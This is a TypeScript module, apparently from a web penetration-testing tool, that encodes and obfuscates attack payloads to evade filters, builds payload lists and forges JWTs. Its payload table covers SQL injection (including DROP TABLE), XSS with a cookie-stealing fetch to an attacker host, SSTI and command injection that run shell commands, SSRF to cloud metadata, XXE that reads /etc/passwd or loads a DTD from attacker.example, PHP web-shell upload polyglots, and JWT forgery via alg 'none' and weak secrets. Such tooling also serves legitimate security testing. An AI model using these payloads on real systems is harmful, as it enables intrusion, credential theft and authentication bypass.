import { createHmac } from "node:crypto"
import type { HandlerGroup } from "./types.js"

function b64urlEncode(input: string): string {
  return Buffer.from(input, "utf8").toString("base64url")
}

function b64urlDecode(input: string): string {
  return Buffer.from(input, "base64url").toString("utf8")
}

function signHmac(alg: string, data: string, secret: string): string {
  const hash = alg === "HS512" ? "sha512" : alg === "HS384" ? "sha384" : "sha256"
  return createHmac(hash, secret).update(data).digest("base64url")
}

function encode(input: string, algorithm: string): string {
  switch (algorithm) {
    case "url":
      return encodeURIComponent(input)
    case "double_url":
      return encodeURIComponent(encodeURIComponent(input))
    case "base64":
      return Buffer.from(input, "utf8").toString("base64")
    case "hex": {
      return Buffer.from(input, "utf8").toString("hex")
    }
    case "json":
      return JSON.stringify(input)
    case "html": {
      return input.replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#x27;" })[c]!)
    }
    case "unix_time": {
      const n = Number(input)
      if (!Number.isNaN(n)) return Math.floor(n).toString()
      const t = Date.parse(input)
      if (!Number.isNaN(t)) return Math.floor(t / 1000).toString()
      throw new Error(`cannot parse unix_time input: ${input}`)
    }
    case "unicode": {
      return Array.from(input)
        .map((c) => `\\u${c.charCodeAt(0).toString(16).padStart(4, "0")}`)
        .join("")
    }
    default:
      throw new Error(`unknown encode algorithm: ${algorithm}`)
  }
}

function obfuscate(input: string, technique: string): string[] {
  const variants = new Set<string>()
  switch (technique) {
    case "case": {
      variants.add(input.toLowerCase())
      variants.add(input.toUpperCase())
      for (const i of [0, 1, 2]) {
        variants.add(
          Array.from(input)
            .map((c, j) => ((j + i) % 2 === 0 ? c.toUpperCase() : c.toLowerCase()))
            .join(""),
        )
      }
      break
    }
    case "unicode": {
      variants.add(Array.from(input).map((c) => c.replace(/[a-zA-Z]/, (l) => String.fromCharCode(l.charCodeAt(0) + 0xfee0))).join(""))
      variants.add(Array.from(input).map((c) => `\\u${c.charCodeAt(0).toString(16)}`).join(""))
      variants.add(
        Array.from(input)
          .map((c) => {
            if (c === "<") return "＜"
            if (c === ">") return "＞"
            if (c === "'") return "＇"
            return c
          })
          .join(""),
      )
      break
    }
    case "comment_fold": {
      for (const k of [1, 2, 3]) {
        const chars = Array.from(input)
        const out: string[] = []
        for (let i = 0; i < chars.length; i++) {
          out.push(chars[i])
          if ((i + 1) % k === 0 && i < chars.length - 1) out.push("/**/")
        }
        variants.add(out.join(""))
      }
      break
    }
    case "chunk": {
      const chunks = Array.from(input)
      variants.add(chunks.join("\n"))
      variants.add(chunks.join(" "))
      variants.add(chunks.join("\u0000"))
      variants.add(chunks.join("/**/"))
      break
    }
    case "double_encode": {
      variants.add(encodeURIComponent(encodeURIComponent(input)))
      variants.add(encodeURIComponent(encodeURIComponent(encodeURIComponent(input))))
      break
    }
    case "whitespace": {
      variants.add(input.replace(/ /g, "\t"))
      variants.add(input.replace(/ /g, "\n"))
      variants.add(input.replace(/ /g, "\r\n"))
      variants.add(input.replace(/ /g, "\u000b"))
      variants.add(input.replace(/ /g, "\f"))
      variants.add(input.replace(/ /g, "\u00a0"))
      break
    }
    default:
      throw new Error(`unknown obfuscation technique: ${technique}`)
  }
  variants.add(input)
  return [...variants]
}

const CLASS_PAYLOADS: Record<string, string[]> = {
  sqli: [
    "' OR '1'='1' --",
    '" OR "1"="1" --',
    "' OR 1=1--",
    "' OR '1'='1'#",
    "admin'--",
    "1' ORDER BY 3--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT username,password FROM users--",
    "'; DROP TABLE users;--",
    "1 AND SLEEP(5)--",
    "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "') OR ('1'='1",
  ],
  xss: [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    '"><script>alert(document.domain)</script>',
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "'\"><img src=x onerror=alert(1)>",
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    "${alert(1)}",
    "<script>fetch('//attacker/'+document.cookie)</script>",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
  ],
  ssti: [
    "{{7*7}}",
    "{{7*'7'}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "{{config}}",
    "${7*7} ${7*'7'}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
  ],
  ssrf: [
    "http://127.0.0.1/",
    "http://127.0.0.1:8080/",
    "http://localhost/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://169.254.169.254/latest/meta-data/",
    "http://2130706433/",
    "http://0x7f000001/",
    "http://0177.0.0.1/",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_INFO",
    "http://127.0.0.1:22/",
  ],
  xxe: [
    "<!DOCTYPE x [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>",
    "<!DOCTYPE x [ <!ENTITY xxe SYSTEM \"http://127.0.0.1/\"> ]>",
    "<!DOCTYPE x [ <!ENTITY xxe 'file:///etc/passwd'> ]>",
    "<!DOCTYPE root [<!ENTITY % ext SYSTEM \"http://attacker.example/dtd\"> %ext;]>",
    '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY b SYSTEM "file:///etc/passwd">]><a>&b;</a>',
  ],
  traversal: [
    "../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "....//etc/passwd",
    "..%2fetc%2fpasswd%00.png",
  ],
  lfi: [
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=/etc/passwd",
    "data://text/plain;base64,PD9waHAgZWNobyAnUElORyc7Pz4=",
    "expect://id",
    "../../../etc/passwd",
    "/var/log/apache2/access.log",
    "php://input",
    "file:///etc/passwd",
  ],
  cmdi: [
    ";id",
    "|id",
    "`id`",
    "$(id)",
    ";ls -la",
    "||id",
    "%0aid",
    "';id;'",
    "`whoami`",
    "1|id",
    "&id&",
    "$(cat /etc/passwd)",
  ],
  header_injection: [
    "%0d%0aX-Injected: 1",
    "%0d%0aSet-Cookie: injected=1",
    "\r\nX-Test: 1",
    "%0aContent-Length: 0",
    "\r\n\r\n<html>INJECTED</html>",
    "%0d%0aLocation: https://attacker.example",
    "\r\nX-Forwarded-For: 127.0.0.1",
  ],
  upload_polyglot: [
    "GIF89a<?php system($_GET['c']); ?>",
    "GIF89a;<?php system($_GET['c']);?>",
    "GIF89a\x01\x02\x03<?php system($_GET['c']);?>",
    "\x89PNG\r\n\x1a\n<?php system($_GET['c']);?>",
    "<?php system($_GET['c']);?>",
    "\xFF\xD8\xFF\xE0<?php system($_GET['c']);?>",
    "<script>alert(1)</script>",
  ],
  jwt_tamper: [
    '{"alg":"none"}',
    '{"alg":"None"}',
    '{"alg":"none","typ":"JWT"}',
    '{"alg":"HS256","typ":"JWT"}',
    '{"alg":"HS384"}',
    '{"alg":"HS512"}',
  ],
}

const WEAK_SECRETS = ["secret", "key", "password", "jwt_secret", ""]

export function payloadHandlers(): HandlerGroup {
  return {
    "payload.encode": (params) => {
      const algorithm = String(params["algorithm"] ?? "")
      const input = String(params["input"] ?? "")
      return { output: encode(input, algorithm), algorithm, input }
    },
    "payload.obfuscate": (params) => {
      const technique = String(params["technique"] ?? "")
      const input = String(params["input"] ?? "")
      return { outputs: obfuscate(input, technique), technique, input }
    },
    "payload.build": (params) => {
      const cls = String(params["class"] ?? "")
      const base = CLASS_PAYLOADS[cls]
      if (!base) throw new Error(`unknown payload class: ${cls}`)
      const template = typeof params["template"] === "string" ? params["template"] : undefined
      let payloads = base
      if (template) {
        const ph = template.includes("{}") || template.includes("{payload}")
        payloads = payloads.map((p) => (ph ? template.replace("{}", p).replace("{payload}", p) : `${template}${p}`))
      }
      return { payloads, class: cls }
    },
    "crypto.jwt.analyze": (params) => {
      const token = String(params["token"] ?? "")
      const parts = token.split(".")
      if (parts.length < 2) throw new Error("invalid jwt token")
      let header: Record<string, unknown> = {}
      let payload: Record<string, unknown> = {}
      try {
        header = JSON.parse(b64urlDecode(parts[0])) as Record<string, unknown>
      } catch {
        throw new Error("invalid jwt header")
      }
      try {
        payload = JSON.parse(b64urlDecode(parts[1])) as Record<string, unknown>
      } catch {
        throw new Error("invalid jwt payload")
      }
      const alg = String(header["alg"] ?? "unknown")
      const possibleIssues: string[] = []
      if (alg === "none") possibleIssues.push("algorithm is none")
      if (parts.length === 2 || parts[2] === "") possibleIssues.push("empty signature")
      if (!("exp" in payload)) possibleIssues.push("no exp claim")
      if (!("iat" in payload)) possibleIssues.push("no iat claim")
      if (header["typ"] && String(header["typ"]).toLowerCase() !== "jwt") possibleIssues.push("non-jwt typ header")
      return { header, payload, alg, possibleIssues }
    },
    "crypto.jwt.forge": (params) => {
      const token = String(params["token"] ?? "")
      const mutations = (params["mutations"] as Record<string, unknown> | undefined) ?? {}
      const parts = token.split(".")
      if (parts.length < 2) throw new Error("invalid jwt token")
      let header: Record<string, unknown>
      let payload: Record<string, unknown>
      try {
        header = JSON.parse(b64urlDecode(parts[0])) as Record<string, unknown>
        payload = JSON.parse(b64urlDecode(parts[1])) as Record<string, unknown>
      } catch {
        throw new Error("invalid jwt token")
      }
      if (mutations["alg"]) header["alg"] = mutations["alg"]
      if (mutations["claims"] && typeof mutations["claims"] === "object") {
        payload = { ...payload, ...(mutations["claims"] as Record<string, unknown>) }
      }

      const tokens: string[] = []
      const signingInput = (h: Record<string, unknown>, p: Record<string, unknown>) =>
        `${b64urlEncode(JSON.stringify(h))}.${b64urlEncode(JSON.stringify(p))}`

      const mutAlg = mutations["alg"] ? String(mutations["alg"]) : undefined
      const noneRequested = !mutAlg || mutAlg.toLowerCase().includes("none")
      if (noneRequested) {
        const noneHeader = { ...header, alg: "none" }
        const noneSig = `${b64urlEncode(JSON.stringify(noneHeader))}.${b64urlEncode(JSON.stringify(payload))}`
        tokens.push(`${noneSig}.`)
        tokens.push(`${noneSig}.x`)
        tokens.push(`${b64urlEncode(JSON.stringify({ ...header, alg: "None" }))}.${b64urlEncode(JSON.stringify(payload))}.`)
      }

      const alg = mutAlg ?? (header["alg"] ? String(header["alg"]) : "HS256")
      if (/^HS\d+$/.test(alg)) {
        for (const secret of WEAK_SECRETS) {
          const data = signingInput({ ...header, alg }, payload)
          tokens.push(`${data}.${signHmac(alg, data, secret)}`)
        }
      }
      if (tokens.length === 0) {
        const data = signingInput(header, payload)
        tokens.push(`${data}.${parts[2] ?? ""}`)
      }
      return { tokens }
    },
  }
}
